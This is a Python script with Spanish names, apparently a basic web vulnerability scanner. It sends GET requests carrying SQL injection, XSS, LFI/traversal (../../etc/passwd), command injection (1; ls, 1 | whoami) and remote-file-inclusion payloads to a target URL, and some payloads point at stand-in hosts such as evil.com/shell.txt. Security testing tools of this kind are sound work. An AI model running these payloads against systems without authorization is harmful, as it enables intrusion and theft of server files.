#vulnerabilidades.py
import requests

TIMEOUT = 20  # Tiempo de espera máximo en segundos

def verificar_inyeccion_sql(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    payloads = ["' OR 1=1 --", "' UNION SELECT NULL, NULL --", "' OR 'a'='a"]
    for payload in payloads:
        try:
            respuesta = requests.get(f"{url}?id={payload}", timeout=TIMEOUT)
            if "error" in respuesta.text.lower() or "sql" in respuesta.text.lower():
                return f"Posible vulnerabilidad de inyección SQL detectada con el payload: {payload}"
        except requests.exceptions.Timeout:
            return f"Timeout al verificar inyección SQL en {url}"
        except requests.exceptions.RequestException as e:
            return f"Error al realizar la solicitud: {e}"

    return "No se detectaron vulnerabilidades SQL."


def verificar_xss(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    for payload in payloads:
        try:
            respuesta = requests.get(f"{url}?q={payload}", timeout=TIMEOUT)
            if payload in respuesta.text:
                return f"Posible vulnerabilidad XSS detectada con el payload: {payload}"
        except requests.exceptions.Timeout:
            return f"Timeout al verificar XSS en {url}"
        except requests.exceptions.RequestException as e:
            return f"Error al realizar la solicitud: {e}"

    return "No se detectaron vulnerabilidades XSS."


def verificar_lfi(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini", "/etc/passwd"]
    for payload in payloads:
        try:
            respuesta = requests.get(f"{url}?file={payload}", timeout=TIMEOUT)
            if "root:" in respuesta.text or "[extensions]" in respuesta.text:
                return f"Posible vulnerabilidad LFI detectada con el payload: {payload}"
        except requests.exceptions.Timeout:
            return f"Timeout al verificar LFI en {url}"
        except requests.exceptions.RequestException as e:
            return f"Error al realizar la solicitud: {e}"

    return "No se detectaron vulnerabilidades LFI."


def verificar_rfi(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    payloads = ["http://evil.com/shell.txt", "https://attacker.com/malicious.php"]
    for payload in payloads:
        try:
            respuesta = requests.get(f"{url}?file={payload}", timeout=TIMEOUT)
            if "shell" in respuesta.text or "malicious" in respuesta.text:
                return f"Posible vulnerabilidad RFI detectada con el payload: {payload}"
        except requests.exceptions.Timeout:
            return f"Timeout al verificar RFI en {url}"
        except requests.exceptions.RequestException as e:
            return f"Error al realizar la solicitud: {e}"

    return "No se detectaron vulnerabilidades RFI."


def verificar_open_redirect(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    payloads = ["http://evil.com", "//evil.com", "/\\evil.com"]
    for payload in payloads:
        try:
            respuesta = requests.get(f"{url}?redirect={payload}", timeout=TIMEOUT)
            if respuesta.history and respuesta.url.startswith("http://evil.com"):
                return f"Posible vulnerabilidad de Open Redirect detectada con el payload: {payload}"
        except requests.exceptions.Timeout:
            return f"Timeout al verificar Open Redirect en {url}"
        except requests.exceptions.RequestException as e:
            return f"Error al realizar la solicitud: {e}"

    return "No se detectaron vulnerabilidades de Open Redirect."


def verificar_inyeccion_comandos(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    payloads = ["1; ls", "1 && dir", "1 | whoami"]
    for payload in payloads:
        try:
            respuesta = requests.get(f"{url}?cmd={payload}", timeout=TIMEOUT)
            if "root" in respuesta.text or "admin" in respuesta.text or "Directory" in respuesta.text:
                return f"Posible vulnerabilidad de inyección de comandos detectada con el payload: {payload}"
        except requests.exceptions.Timeout:
            return f"Timeout al verificar inyección de comandos en {url}"
        except requests.exceptions.RequestException as e:
            return f"Error al realizar la solicitud: {e}"

    return "No se detectaron vulnerabilidades de inyección de comandos."


def verificar_directory_traversal(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini", "/etc/hosts"]
    for payload in payloads:
        try:
            respuesta = requests.get(f"{url}?path={payload}", timeout=TIMEOUT)
            if "root:" in respuesta.text or "[extensions]" in respuesta.text:
                return f"Posible vulnerabilidad de Directory Traversal detectada con el payload: {payload}"
        except requests.exceptions.Timeout:
            return f"Timeout al verificar Directory Traversal en {url}"
        except requests.exceptions.RequestException as e:
            return f"Error al realizar la solicitud: {e}"

    return "No se detectaron vulnerabilidades de Directory Traversal."
